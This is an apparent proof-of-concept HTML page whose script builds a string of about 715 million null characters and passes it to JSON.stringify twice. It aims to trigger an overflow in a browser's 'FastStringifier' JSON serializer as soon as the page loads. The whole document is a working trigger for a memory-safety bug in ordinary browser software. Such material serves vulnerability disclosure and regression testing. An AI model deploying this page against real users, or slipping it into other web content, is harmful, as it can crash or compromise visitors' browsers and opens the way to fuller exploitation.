<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>FastStringifier Overflow PoC</title>
</head>
<body>
    <script>
        try {
            // Create large string (715,827,883 bytes)
            const string = "\x00".repeat(715827883);
            // Trigger overflow in JSON.stringify
            JSON.stringify(string);
        } catch (e) {
            // Silent catch to attempt twice
        }
        try {
            // Second attempt
            const string = "\x00".repeat(715827883);
            JSON.stringify(string);
        } catch (e) {}
    </script>
</body>
</html>
